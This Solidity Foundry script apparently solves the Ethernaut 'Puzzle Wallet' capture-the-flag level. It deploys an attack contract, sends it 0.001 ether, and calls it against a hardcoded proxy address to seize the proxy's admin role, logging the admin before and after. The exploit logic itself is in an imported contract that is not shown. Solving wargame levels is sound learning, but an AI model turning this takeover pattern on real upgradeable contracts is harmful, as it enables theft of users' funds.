// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {PuzzleProxy} from "../src/levels/PuzzleWallet.sol";
import {PuzzleWalletAttack} from "../src/attacks/PuzzleWalletAttack.sol";

contract PuzzleWalletScript is Script {
    PuzzleProxy public proxy = PuzzleProxy(payable(0x274952ece7529B904b8C327488Cd2Fa5EAe04731));
    PuzzleWalletAttack public attacker;

    function run() external {
	vm.startBroadcast();

	attacker = new PuzzleWalletAttack();
	console.log("PuzzleWalletAttack Contract deployed to:", address(attacker));
	console.log("PuzzleProxy Contract initial admin:", proxy.admin());

	console.log("Attacking...");
	attacker.attack{value: 0.001 ether}(payable(address(proxy)));

	console.log("PuzzleProxy Contract new admin:", proxy.admin());
	
	vm.stopBroadcast();
    }
}
